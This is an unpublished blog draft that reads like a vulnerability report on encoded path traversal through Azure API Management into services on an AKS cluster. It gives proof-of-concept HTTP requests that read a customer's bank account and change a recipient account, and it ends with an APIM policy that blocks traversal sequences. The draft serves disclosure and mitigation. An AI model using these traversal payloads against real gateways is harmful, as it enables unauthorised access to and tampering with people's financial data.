---
layout: post
title: 
subtitle: 
tags: [Azure]
comments: true
published: false
share-img: https://cdn.svenmalvik.com/images/
image: https://cdn.svenmalvik.com/images/
featured-image: https://cdn.svenmalvik.com/images/
---

APIM APIs that uses path parameters can be abused to reach any service exposed on the AKS cluster. Encoded path traversal patterns (e.g. %2f..%2f) can be used to traverse outside of the intended APIM back-end service.

The vulnerability is verified to exist in production.

Impact

Anyone can access all services exposed in the AKS cluster. Many AKS services does not enforce authentication, and this can be exploited to get sensitive information on any user, make changes to user profiles and more. 

Mitigation

Short-term fixes includes enforcing WAF in the App Gateway and/or ensure authentication in APIM policies.

Proof-of-Concept

The following request fetches the bank account of the user with ID 123456. The request can be used as a basis to perform any GET-request to the cluster.

```bash
GET /petstore/animals/123%2f..%2f..%2fvpetstore-payments%2fv1%2fgetCustomerAccount%2fdetails  HTTP/1.1
Host: myhost.com
Connection: close
X-Customer-id: 10003506
X-App-Type: CSR
Ocp-Apim-Subscription-Key: ...
```

The following request changes the recipient bank account of a user. Can be used as a basis to perform any POST-request to the cluster.

```te
POST /petstore/animals/123%2f..%2f..%2fvpetstore-payments%2fv1%2fgetCustomerAccount%2fdetails HTTP/1.1
Host: myhost.com
Connection: close
X-Customer-id: 12121212
X-App-Type: CSR
Ocp-Apim-Subscription-Key: ...
Content-Length: 35
Content-Type: application/json;charset=UTF-8

{"customerAccount":"123456"}
```

```xml
<when condition='@(context.Request.OriginalUrl.Path.Contains("..") || context.Request.OriginalUrl.Path.Contains("%2e%2e"))'>
	<return-response>
		<set-status code="400" reason="Bad Request" />
		<set-header name="Content-Type" exists-action="override">
			<value>application/json;charset=UTF-8</value>
		</set-header>
		<set-body>{"message": "Access denied."}</set-body>
	</return-response>
</when>
```